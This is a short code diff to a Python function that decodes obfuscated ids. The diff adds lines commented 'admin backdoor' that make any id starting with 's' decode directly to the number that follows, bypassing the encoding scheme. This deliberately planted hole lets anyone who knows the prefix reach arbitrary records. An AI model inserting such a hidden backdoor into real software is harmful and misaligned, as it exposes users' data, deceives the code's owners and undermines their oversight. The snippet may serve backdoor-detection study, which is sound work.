@@ -61,6 +61,9 @@ def id_encode(aid):
     #return scrambledigits(len(eid1))+eid1+scrambledigits(len(eid1))+'_'+str(n)
 
 def id_decode(did):
+    # admin backdoor 
+    if did[0]=='s':
+        return int(did[1:])
     de = lambda x: math.floor(math.sqrt(x))
     #did1,m=tuple(did.split('_'))
     r = len(did) % 3
